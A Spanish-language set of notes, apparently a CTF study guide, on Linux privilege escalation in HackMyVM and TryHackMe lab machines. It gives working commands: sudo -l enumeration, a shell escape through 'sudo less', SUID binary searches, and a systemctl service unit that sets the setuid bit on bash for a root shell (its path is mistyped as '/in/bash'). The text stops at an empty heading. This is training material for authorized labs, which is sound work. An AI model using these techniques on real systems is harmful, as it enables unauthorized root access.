---
icon: '7'
---

# Escalada de Privilegios + Post Explotación

## Escalada de Privilegios en Linux – Sudo -l

{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Friendly" %}

Subimos el payload a través del protócolo FTP. Nos ponemos en escucha mientras carga la página para la **Reverse Shell**. Hacemos tratamiento de la **TTY**.&#x20;

{% embed url="https://gtfobins.github.io/" %}

```bash
sudo -l
```

Con el comando proporcionado en la página debemos de poner la ruta absoluta.

## Escalada de Privilegios en Linux – Sudo -l | Parte 2

{% embed url="https://tryhackme.com/room/brooklynninenine" %}

```bash
sudo -l 
sudo /usr/bin/less /etc/profile
!/bin/sh
```

## Escalada de Privilegios en Linux – Binarios SUID

{% embed url="https://tryhackme.com/room/vulnversity" %}

Otra técnica muy frecuente para escalar privilegios en Linux es la enumeración de binarios **SUID**, donde podremos conocer que binarios tienen **setuid 0** y podemos utilizarlos para escalar privilegios en Linux.

```bash
find / -perm -4000 2>/dev/null
```

En el directorio `/tmp`, creamos un archivo en **bash** con este contenido.

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /in/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Ejecutamos.

```bash
bash archivo.sh
```

Hemos abusado de un binario. Ya somos **root**.

```bash
bash -p
```

## Escalada de Privilegios en Linux – Binarios SUID | Parte 2
